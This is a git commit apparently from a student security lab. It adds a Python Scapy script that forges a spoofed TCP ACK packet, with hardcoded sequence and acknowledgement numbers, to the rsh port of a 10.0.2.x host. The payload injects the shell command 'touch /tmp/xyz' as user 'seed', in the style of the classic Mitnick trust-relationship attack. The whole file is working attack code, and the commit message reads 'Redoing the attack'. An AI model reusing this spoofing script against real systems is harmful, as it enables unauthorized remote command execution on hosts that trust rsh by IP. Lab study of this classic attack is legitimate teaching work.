e85dd18803efaf1b0087e59a3c2f064c7924f4c1
alakbarz <me@alak.bar>
2021-03-03 20:25:02 +0000

    Redoing the attack

---
+++ step2.py
@@ -0,0 +1,18 @@
+from scapy.all import *
+import time
+from random import randint
+ 
+x_ip = "10.0.2.8"
+x_port = 514
+ 
+# srv_ip = "10.0.2.7" # Yaseen's machine
+srv_ip = "10.0.2.15" # Alakbar's machine
+srv_port = 1023
+sequence = 778933536
+print("Inital sequence number: " + str(sequence))
+
+ip = IP(src=srv_ip, dst=x_ip)
+tcp = TCP(sport=srv_port, dport=x_port, flags="A", seq=sequence, ack=898627499)
+data = "9090\x00seed\x00dees\x00touch /tmp/xyz\x00"
+pkt = ip/tcp/data
+send(pkt)
